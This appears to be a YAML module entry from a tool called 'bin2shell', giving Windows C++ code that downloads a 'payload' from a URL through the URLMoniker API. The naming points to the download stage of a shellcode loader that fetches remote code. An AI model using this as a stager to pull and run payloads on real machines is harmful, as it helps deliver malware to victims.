  name: urlmon
  desc: Windows URLMoniker IStream API — minimal-code URL download via COM, block until complete
  cpp_includes: |
    #include <stdexcept>
    #include <string>
    #include <vector>
    #include <windows.h>
    #include <urlmon.h>
    #pragma comment(lib, "urlmon.lib")
  cpp_fetch_bytes: |
    static std::vector<unsigned char> bin2shell_fetch_payload_from_url(const std::string& url) {
        IStream* pstm = nullptr;
        HRESULT hr = URLOpenBlockingStreamA(nullptr, url.c_str(), &pstm, 0, nullptr);
        if (FAILED(hr) || !pstm)
            throw std::runtime_error("URLOpenBlockingStream failed");
        std::vector<unsigned char> body;
        char buf[4096];
        ULONG rd = 0;
        for (;;) {
            HRESULT rhr = pstm->Read(buf, sizeof(buf), &rd);
            if (rd > 0) body.insert(body.end(), buf, buf + rd);
            if (rhr != S_OK) break;
            rd = 0;
        }
        pstm->Release();
        return body;
    }
